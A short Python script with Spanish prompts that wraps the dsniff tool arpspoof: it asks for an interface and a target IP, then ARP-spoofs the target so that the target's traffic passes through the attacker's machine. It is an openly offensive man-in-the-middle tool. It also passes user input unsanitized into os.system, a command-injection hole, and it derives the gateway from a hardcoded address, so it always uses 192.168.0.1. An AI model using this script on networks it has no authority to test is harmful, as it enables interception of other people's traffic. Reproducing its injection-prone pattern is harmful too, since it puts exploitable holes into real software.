#!/usr/bin/env python3

import os
import signal
import sys

def ctrl_c(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

print("\n[+] Creado por cifucarst\n")
print("""
    ___       _ _ 
  / _ \\_____| (_|
 | (_) |_____| |_ 
  \\___/     |___/ 

   cifucarst
""")

def check_herramienta(tool):
    if os.system(f"which {tool} >/dev/null 2>&1") != 0:
        print(f"Error: {tool} no está instalado. Por favor, instala {tool} y vuelve a intentarlo.", file=sys.stderr)
        sys.exit(1)

check_herramienta("dsniff")

interfaz = input("Inserte la interfaz de red que quieres analizar: ")
ip = input("Inserte la IP objetivo: ")

puerta_enlace = "192.168.0.12".rsplit('.', 1)[0] + ".1"

os.system(f"arpspoof -i {interfaz} -t {ip} {puerta_enlace}")